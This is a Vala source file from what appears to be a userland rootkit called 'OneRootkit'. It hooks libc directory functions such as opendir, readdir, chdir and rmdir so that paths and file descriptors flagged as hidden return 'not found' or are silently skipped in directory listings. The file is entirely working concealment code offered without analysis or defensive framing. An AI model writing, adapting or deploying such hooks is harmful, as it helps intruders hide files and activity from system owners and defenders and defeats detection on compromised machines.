using Posix;

delegate unowned int ChdirMethod (string pathname);
delegate unowned int FchdirMethod (int fd);
delegate unowned int RmdirMethod (string pathname);
delegate unowned int DirfdMethod (Posix.Dir dir);

delegate unowned Posix.Dir* FdopendirMethod (int fd);
delegate unowned Posix.Dir* OpendirMethod (string name);

delegate unowned Posix.DirEnt* ReaddirMethod (Posix.Dir dir);
delegate unowned ssize_t ReadlinkMethod (string path, char[] buf, size_t size);

public static int chdir (string pathname)
{
	ChdirMethod oldChdir = (ChdirMethod) DLHandles.LIBC().GetMethod("chdir");

	if(OneRootkit.IsPathHidden(pathname))
	{
		GLib.errno = Posix.ENOENT;
		return -1;
	}

	return oldChdir(pathname);
}

public static int fchdir (int fd)
{
	FchdirMethod oldFchdir = (FchdirMethod) DLHandles.LIBC().GetMethod("fchdir");

	if(OneRootkit.IsFdHidden(fd))
	{
		GLib.errno = Posix.ENOENT;
		return -1;
	}

	return oldFchdir(fd);
}

public static Posix.Dir* fdopendir (int fd)
{
	FdopendirMethod oldFdopendir = (FdopendirMethod) DLHandles.LIBC().GetMethod("fdopendir");

	if(OneRootkit.IsFdHidden(fd))
	{
		GLib.errno = Posix.ENOENT;
		return null;
	}

	return oldFdopendir(fd);
}

public static int rmdir (string pathname)
{
	RmdirMethod oldRmdir = (RmdirMethod) DLHandles.LIBC().GetMethod("rmdir");

	if(OneRootkit.IsPathHidden(pathname))
	{
		GLib.errno = Posix.ENOENT;
		return -1;
	}

	return oldRmdir(pathname);
}

public static Posix.Dir* opendir (string name)
{
	OpendirMethod oldOpendir = (OpendirMethod) DLHandles.LIBC().GetMethod("opendir");

	if(OneRootkit.IsPathHidden(name))
	{
		GLib.errno = Posix.ENOENT;
		return null;
	}

	unowned Posix.Dir dir = oldOpendir(name);
	DirfdMethod oldDirfd = (DirfdMethod) DLHandles.LIBC().GetMethod("dirfd");
	int fd = oldDirfd(dir);

	if(OneRootkit.IsFdHidden(fd))
	{
		GLib.errno = Posix.ENOENT;
		return null;
	}

	return dir;
}

public static Posix.DirEnt* readdir (Posix.Dir dir)
{
	ReaddirMethod oldReaddir = (ReaddirMethod) DLHandles.LIBC().GetMethod("readdir");
	string fullPath = OneRootkit.GetFullDirPath(dir);

	DirEnt* current = null;

	while (true)
	{
		current = oldReaddir(dir);

		if(current == null)
		{
			return current;
		}

		string currentEntry = fullPath + "/" + (string) ((DirEnt)current).d_name;

		if(!OneRootkit.IsPathHidden(currentEntry))
		{
			return current;
		}
	}

	return current;
}